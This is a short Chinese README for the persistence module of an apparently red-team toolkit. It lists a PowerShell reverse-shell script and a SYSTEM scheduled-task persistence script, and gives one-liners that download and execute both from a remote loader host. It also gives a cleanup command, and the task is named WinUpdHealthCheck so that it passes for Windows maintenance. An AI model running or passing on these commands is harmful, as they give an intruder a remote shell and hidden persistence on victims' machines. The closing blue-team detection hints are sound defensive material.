# 持久化

| 文件 | 用途 |
|---|---|
| `reverse_shell.ps1` | 交互式 PS 反向 shell（`nc -lvnp 4444`） |
| `persist_task.ps1` | 计划任务持久化（SYSTEM，开机+登录触发） |

```powershell
irm http://LOADER_IP:8090/persistence/reverse_shell.ps1 | iex
irm http://LOADER_IP:8090/persistence/persist_task.ps1 | iex
schtasks /delete /tn WinUpdHealthCheck /f   # 清理
```

排查点（蓝队视角）：`Get-ScheduledTask | ? TaskName -like "WinUpd*"`、`4624/4698` 事件、异常 powershell.exe 父进程。
